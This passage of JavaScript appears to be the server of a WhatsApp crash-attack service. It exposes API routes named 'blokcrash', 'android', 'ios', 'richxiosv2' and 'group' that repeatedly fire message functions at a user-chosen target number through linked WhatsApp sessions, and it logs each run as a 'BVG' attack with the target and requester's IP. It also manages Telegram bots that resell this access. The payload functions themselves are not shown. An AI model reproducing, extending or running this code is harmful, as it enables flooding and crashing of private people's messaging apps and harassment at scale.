            const stillAlive = (webWhatsappStatus.get(session.number) === true) || 
                               (whatsappStatusMap.get(session.number) === true);
            if (!stillAlive || !session.sock) break;

            await xeonUnifiedRichResponseMessage2(jid, session.number, null, bot);
            successCount++;
          } catch (err) {
            console.log(`[iOS Loop Error] ${err.message}`);
          }
        }

        await sendLogToGroup('WEBSITE LOG', 
`✅ Richxios BVG
By: ${username}
Target: ${target}
Loops: ${successCount}/${loopCount}
IP: ${ip}
Time: ${getIndianTime()}`);
      })();
    }
    
    // ---------- RICHXIOSV2 ----------
else if (type === 'richxiosv2') {
  (async () => {
    const loopCount = GREETING_LOOPS.richxiosv2;
    let successCount = 0;

    for (let i = 0; i < loopCount; i++) {
      try {
        const stillAlive = (webWhatsappStatus.get(session.number) === true) || 
                           (whatsappStatusMap.get(session.number) === true);
        if (!stillAlive || !session.sock) break;

        await xeonRichIosV2(jid, session.number, null, bot);
        successCount++;
      } catch (err) {
        console.log(`[richxiosv2 Loop Error] ${err.message}`);
      }
    }

    await sendLogToGroup('WEBSITE LOG', 
`✅ Richxiosv2 BVG
By: ${username}
Target: ${target}
Loops: ${successCount}/${loopCount}
IP: ${ip}
Time: ${getIndianTime()}`);
  })();
}

    // ---------- GROUP ----------
    else if (type === 'group') {
      (async () => {
        const loopCount = GREETING_LOOPS.group;
        let successCount = 0;

        for (let i = 0; i < loopCount; i++) {
          try {
            const stillAlive = (webWhatsappStatus.get(session.number) === true) || 
                               (whatsappStatusMap.get(session.number) === true);
            if (!stillAlive || !session.sock) break;

            await template3(jid, session.number, null, bot);
            successCount++;
            await sleep(800);
          } catch (err) {
            console.log(`[Group Loop Error] ${err.message}`);
          }
        }

        await sendLogToGroup('WEBSITE LOG', 
`✅ Group BVG
By: ${username}
Target: ${target}
Loops: ${successCount}/${loopCount}
IP: ${ip}
Time: ${getIndianTime()}`);
      })();
    }

  } catch (err) {
    console.error(`[Greeting ${type}]`, err.message);
    await sendLogToGroup('WEBSITE LOG', 
`❌ Failed
Command: ${type}
By: ${username}
Target: ${target}
Error: ${err.message}
IP: ${ip}
Time: ${getIndianTime()}`);

    if (!res.headersSent) {
      res.status(500).json({ success: false, message: err.message || 'Failed to send' });
    }
  }
}

app.post('/api/greeting/blokcrash', authWebsiteOrApi, express.json(), (req, res) => {
  handleGreeting('blokcrash', req.body?.target, req, res);
});

app.post('/api/greeting/android', authWebsiteOrApi, express.json(), (req, res) => {
  handleGreeting('android', req.body?.target, req, res);
});
app.post('/api/greeting/ios', authWebsiteOrApi, express.json(), (req, res) => {
  handleGreeting('ios', req.body?.target, req, res);
});
app.post('/api/greeting/richxiosv2', authWebsiteOrApi, express.json(), (req, res) => {
  handleGreeting('richxiosv2', req.body?.target, req, res);
});
app.post('/api/greeting/group', authWebsiteOrApi, express.json(), (req, res) => {
  handleGreeting('group', req.body?.target, req, res);
});

async function main() {
  try {
    console.log('✅ Telegram root bot started.');
    await initializeUserBots();
    console.log(`Root bot and ${botInstances.size - 1} user bots initialized`);
    
    // This runs once after all bots are started
    botInstances.forEach((b, key) => {
      // We explicitly skip the main/root bot
      if (key !== 'root') {  
        // Only user-added bots enter here
        b.on('polling_error', (error) => {
          // Only react when Telegram says "401 Unauthorized"
          if (error.response && error.response.statusCode === 401) {
            console.log(`User bot ${key} was banned/revoked → removing it automatically`);

            b.stopPolling();                  // stop only this one bot
            botInstances.delete(key);         // remove from memory

            // remove from database too
            const userId = Object.keys(db.botTokens).find(id => db.botTokens[id] === b.token);
            if (userId) {
              delete db.botTokens[userId];
              saveJson('./database/bot_tokens.json', db.botTokens);
            }
          }
          // Any other error (network, rate-limit, etc.) is ignored → bot keeps trying
        });
      }
      // ← the main bot (key === 'root') is completely untouched
    });
    
    // === SAFELY START ONLY VALID WHATSAPP SESSIONS ===
    for (const chatIdStr in db.userNumbers) {
      const number = db.userNumbers[chatIdStr];

      // Skip null, undefined, or invalid number formats
      if (!number || typeof number !== 'string' || !/^\d{8,15}$/.test(number.trim())) {
        console.log(`[SESSION] Skipping invalid/null WhatsApp number for user ${chatIdStr}: ${number}`);
        continue;
      }

      console.log(`[SESSION] Starting WhatsApp session for number: ${number} (user ${chatIdStr})`);
      await startWhatsapp(number.trim(), bot); // Pass bot instance
    }
    
    // === RESTORE WEB SESSIONS ===
await restoreWebSessions();

    migratePremiumDB();
    cleanBannedFromAll();
    setInterval(cleanBannedFromAll, 10 * 60 * 1000); // Every 10 minutes
  } catch (error) {
    console.error('Error in main:', error.message);
  }
}

main();

process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});